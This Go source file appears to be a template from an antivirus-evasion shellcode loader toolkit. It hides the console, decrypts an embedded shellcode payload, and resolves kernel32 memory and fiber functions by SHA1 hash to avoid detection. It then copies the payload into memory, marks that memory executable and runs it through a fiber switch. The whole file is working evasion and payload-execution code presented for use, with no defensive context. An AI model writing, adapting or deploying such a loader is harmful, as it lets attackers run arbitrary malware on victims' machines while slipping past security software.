package main

import (
	Go2public "Go2bypass/Public"
	_ "embed"
    Go2gabh "Go2bypass/Doge-Gabh/Gabh"
	"log"
	"os"
	"syscall"
	"unsafe"
)
//go:embed CodeToStringShell.txt
var CodeToStringShell string

var ApiDe Go2public.ApiEDcrypt
var CodeEnContent Go2public.CodToshellKey

const (
	MEM_COMMIT        = 0x1000
	MEM_RESERVE       = 0x2000
	PAGE_EXECUTE_READ = 0x20
	PAGE_READWRITE    = 0x04
)

func main() {
	/******HideConsole******/
	Go2public.Peels()
	CodeEnContent.KeyKey = `/******KeyKey******/`
	CodeEnContent.CodeToStringShell = CodeToStringShell
	/******DecodeType******/
	sc, err := ApiDe.CodeToShellDncrypt(CodeEnContent)
	if err != nil {
		os.Exit(0)
	}
    pVPt, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "69e06440b787b5b3fac43a60d3f019be95f63896", Go2public.Str2sha1)
    pVAc, _, e := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "3567705df8e544d414d315f64ae47e5861b0f68a", Go2public.Str2sha1)
    if e != nil {
        panic(e)
    }
    pCTTF, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "aa85bb3c4e320b27a183d65404ff90cfad8cccb7", Go2public.Str2sha1)
    pCF, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "728bd37ba7ded6f6cda8c9ccaca623f016ccbc46", Go2public.Str2sha1)
    pSTF, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "2e640509ef7b4af90edc332f7da9c8b8021418c9", Go2public.Str2sha1)
    fiberAddr, _, _ := syscall.Syscall(uintptr(pCTTF), 0, 0, 0, 0)
    addr, _, _ := syscall.Syscall6(uintptr(pVAc), 4, 0, uintptr(len(sc)), uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(PAGE_READWRITE), 0, 0)
    if addr == 0 {
        log.Fatal("")
    }
    Go2public.Cpymem(addr, sc)
    oldProtect := PAGE_READWRITE
    syscall.Syscall6(uintptr(pVPt), 4, addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
    fiber, _, _ := syscall.Syscall(uintptr(pCF), 3, 0, addr, 0)
    syscall.Syscall(uintptr(pSTF), 1, fiber, 0, 0)
    syscall.Syscall(uintptr(pSTF), 1, fiberAddr, 0, 0)
}
